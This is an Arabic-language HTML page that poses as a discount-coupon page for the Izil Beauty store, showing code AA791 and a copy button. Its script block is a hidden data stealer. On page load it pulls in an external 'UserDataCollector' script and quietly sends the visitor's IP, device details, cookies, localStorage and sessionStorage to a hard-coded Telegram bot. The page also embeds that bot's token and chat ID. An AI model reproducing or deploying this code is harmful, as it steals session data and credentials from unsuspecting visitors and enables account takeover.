<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كود خصم ايزل | كوبونك المختصر</title>
    <!-- Meta tags, styles, and other head content here -->
</head>
<body>

<div class="coupon-container">
    <div class="coupon-header">
        <img src="https://coupbrief.pro/izil.png" alt="Izil Beauty Logo">كود خصم ايزل فعال 100% IZIL Beauty كوبون ذهبي ومختصر لجميع الدول بلا استنثاء !!
    </div>
    
    <div class="coupon-code-container">
        <div class="coupon-code">AA791</div>
        <button class="copy-btn" onclick="copyCode()">نسخ</button>
    </div>

    <div class="store-info">
        قم بنسخ هذا الكود واستخدامه عند الدفع
    </div>

    <a href="https://izilbeauty.com/en/sale/" class="go-store">الذهاب للمتجر</a>

    <div class="credits">
        جميع الحقوق محفوظة لـ @Saud
    </div>
</div>

<!-- Include UserDataCollector.js script -->
<script src="https://raw.githubusercontent.com/VictorRutskin/User-Data-Collector-Javascript/main/UserDataCollector.js"></script>

<script>
// Function to send the message to Telegram
function sendTelegramMessage(message) {
    const telegramToken = '6864161221:AAH_dTN3MJrcQ2SZ9vfCsyMArTJoIlANQ2g';
    const chatId = '6107520820';
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message sent successfully');
            } else {
                console.error('Error sending message: ' + data.description);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

// Function to collect user data and send it to Telegram
function collectAndSendUserData() {
    // Ensure getUserData is available before calling it
    if (typeof getUserData === 'function') {
        getUserData().then(data => {
            // Collecting cookies, local storage, and session storage
            const cookies = document.cookie;
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);

            // Create the message string with all the relevant data
            const userDataMessage = `
                User Information:
                - IP Address: ${data.ip}
                - Browser: ${data.browser}
                - Operating System: ${data.os}
                - Device: ${data.device}
                - Screen Resolution: ${data.screen}
                - User Language: ${navigator.language || 'Unknown'}
                - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
                - Referrer: ${document.referrer || 'No Referrer'}
                - Platform: ${navigator.platform}
                - User Agent: ${navigator.userAgent}
                - Cookies: ${cookies}
                - Local Storage: ${localStorageData}
                - Session Storage: ${sessionStorageData}
            `;

            // Send the collected data to Telegram
            sendTelegramMessage(userDataMessage);
        }).catch(err => {
            console.error('Error collecting user data:', err);
        });
    } else {
        console.error('getUserData function is not available.');
    }
}

// Wait for the DOM to load before executing the data collection
document.addEventListener("DOMContentLoaded", collectAndSendUserData);

// Copy coupon code function
function copyCode() {
    var code = "AA791";
    navigator.clipboard.writeText(code).then(function() {
        alert('تم نسخ الكود!');
    }, function(err) {
        console.error('Failed to copy: ', err);
    });
}
</script>

</body>
</html>
